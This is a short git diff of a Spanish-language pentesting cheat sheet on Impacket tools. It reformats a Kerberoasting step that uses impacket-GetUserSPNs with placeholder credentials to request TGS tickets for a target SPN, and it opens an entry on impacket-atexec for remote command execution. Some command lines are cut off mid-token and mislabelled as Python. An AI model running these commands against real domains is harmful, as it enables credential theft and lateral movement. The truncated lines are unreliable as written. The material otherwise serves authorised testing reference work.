@@ -24,15 +24,11 @@ enumerar los SPNs asociados a un usuario específico o a todos los usuarios en u
 impacket-GetUserSPNs.py -request <USER>:<PASSWORD> -dc-ip <DOMAIN_CONTROLLER_IP> <DOMAIN>/<USER>
 ```
 ### impacket-GetUserSPNs
+Obtención del TGS: Una vez que hayas identificado el SPN deseado, puedes solicitar un TGS para ese SPN utilizando `GetUserSPNs
 ```python
-
+impacket-GetUserSPNs.py <USER>:<PASSWORD> -spn <SPN_TO_TARGET> -dc-ip <DOMAIN_CONTROL
 ```
-    
-2. Obtención del TGS: Una vez que hayas identificado el SPN deseado, puedes solicitar un TGS para ese SPN utilizando `GetUserSPNs.py`.
-    
-    bashCopy code
-    
-    `impacket-GetUserSPNs.py <USER>:<PASSWORD> -spn <SPN_TO_TARGET> -dc-ip <DOMAIN_CONTROL`
+
 ### impacket-atexec:
 Descripción: Permite ejecutar comandos en un sistema remoto utilizando el servicio Task Scheduler (programador de tareas).
 ```python
